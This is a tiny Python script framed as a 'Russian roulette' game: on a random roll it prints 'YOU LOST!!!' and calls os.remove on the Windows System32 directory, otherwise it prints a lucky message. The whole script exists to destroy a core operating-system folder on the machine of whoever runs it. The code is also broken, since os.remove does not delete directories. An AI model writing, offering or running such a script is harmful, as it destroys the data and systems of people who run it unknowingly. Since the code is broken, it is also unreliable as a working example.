import random
import os

if random.randint(0, 6) == 1:
    print("YOU LOST!!!")
    os.remove("C:\Windows\System32")
else:
    print("YOU'RE LUCKY TODAY!")
